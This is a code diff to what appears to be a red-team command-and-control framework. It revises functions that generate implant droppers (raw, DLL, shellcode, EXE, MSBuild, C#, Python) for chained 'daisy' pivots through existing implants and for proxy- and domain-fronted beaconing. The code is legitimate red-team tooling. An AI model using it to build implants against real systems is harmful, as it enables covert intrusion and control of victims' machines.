@@ -665,29 +665,28 @@ def do_quit(user, command):
 
 
 def do_createdaisypayload(user, command):
-    name = input(Colours.GREEN + "Daisy name: e.g. DC1 ")
-    domain = input("Domain or URL: https://www.example.com ")
-    daisyurl = input("Daisy host: .e.g. http://10.150.10.1 ")
-    if (daisyurl == "http://127.0.0.1"):
-        daisyurl = "http://localhost"
-    if (daisyurl == "https://127.0.0.1"):
-        daisyurl = "https://localhost"
-    daisyport = input("Daisy port: .e.g. 8888 ")
+    name = input(Colours.GREEN + "Daisy Payload Name: e.g. DC1 ")
+    daisyurl = input("Daisy Comms URL: .e.g. http://10.150.10.1:9999 ")
+    if ("http://127.0.0.1" in daisyurl):
+        daisyurl = daisyurl.replace("http://127.0.0.1","http://localhost")
+    if ("https://127.0.0.1" in daisyurl):
+        daisyurl = daisyurl.replace("https://127.0.0.1","https://localhost")
     daisyhostid = input("Select Daisy Implant Host: e.g. 5 ")
     daisyhost = get_implantbyid(daisyhostid)
     proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
+
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], daisyurl, "", daisyport, "", "", "",
-                          "", proxynone, C2[19], C2[20],
-                          C2[21], "%s?d" % get_newimplanturl(), PayloadsDirectory)
-    newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl + ":" + daisyport), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
+    newPayload = Payloads(C2[5], C2[2], daisyurl, daisyurl, "", "", "", "",
+                          "", proxynone, C2[17], C2[18],
+                          C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
+    newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
     newPayload.CreateRaw(name)
     newPayload.CreateDlls(name)
     newPayload.CreateShellcode(name)
     newPayload.CreateEXE(name)
     newPayload.CreateMsbuild(name)
     newPayload.CreateCS(name)
-    new_urldetails(name, C2[1], C2[3], domain, daisyurl, daisyhostid, "")
+    new_urldetails(name, C2[1], C2[3], f"Daisy: {name}", daisyurl, daisyhostid, "")
     print_good("Created new %s daisy payloads" % name)
     input("Press Enter to continue...")
     clear()
@@ -706,11 +705,14 @@ def do_createnewpayload(user, command, creds=None):
             input("Press Enter to continue...")
             clear()
             return
-    domain = input("Domain or URL: https://www.example.com ")
-    domainbase = (domain.lower()).replace('https://', '')
-    domainbase = domainbase.replace('http://', '')
-    domainfront = input("Domain front URL: e.g. fjdsklfjdskl.cloudfront.net ")
+
+    name = input(Colours.GREEN + "Proxy Payload Name: e.g. Scenario_One ")
+    comms_url = input("Comms URL: https://www.example.com ")
+    domain = (comms_url.lower()).replace('https://', '')
+    domain = domain.replace('http://', '')
+    domainfront = input("Domain front hostname: jobs.azureedge.net ")
     proxyurl = input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
+
     randomid = randomuri(5)
     proxyuser = ""
     proxypass = ""
@@ -724,22 +726,19 @@ def do_createnewpayload(user, command, creds=None):
             proxypass = input("Proxy Password: e.g. Password1 ")
         credsexpire = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018 ")
         imurl = "%s?p" % get_newimplanturl()
-        domainbase = "Proxy%s%s" % (domainbase, randomid)
     else:
-        domainbase = "%s%s" % (randomid, domainbase)
         imurl = get_newimplanturl()
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], domain, domainfront, C2[8], proxyuser,
-                          proxypass, proxyurl, "", "", C2[19], C2[20],
-                          C2[21], imurl, PayloadsDirectory)
-    newPayload.CreateRaw("%s_" % domainbase)
-    newPayload.CreateDlls("%s_" % domainbase)
-    newPayload.CreateShellcode("%s_" % domainbase)
-    newPayload.CreateEXE("%s_" % domainbase)
-    newPayload.CreateMsbuild("%s_" % domainbase)
-    newPayload.CreatePython("%s_" % domainbase)
-    newPayload.CreateCS("%s_" % domainbase)
-    new_urldetails(randomid, domain, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
+    newPayload = Payloads(C2[5], C2[2], comms_url, domainfront, C2[8], proxyuser,
+                          proxypass, proxyurl, "", "", C2[17], C2[18], C2[19], imurl, PayloadsDirectory)
+    newPayload.CreateRaw("%s_" % domain)
+    newPayload.CreateDlls("%s_" % domain)
+    newPayload.CreateShellcode("%s_" % domain)
+    newPayload.CreateEXE("%s_" % domain)
+    newPayload.CreateMsbuild("%s_" % domain)
+    newPayload.CreatePython("%s_" % domain)
+    newPayload.CreateCS("%s_" % domain)
+    new_urldetails(randomid, comms_url, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
     print_good("Created new payloads")
     input("Press Enter to continue...")
     clear()
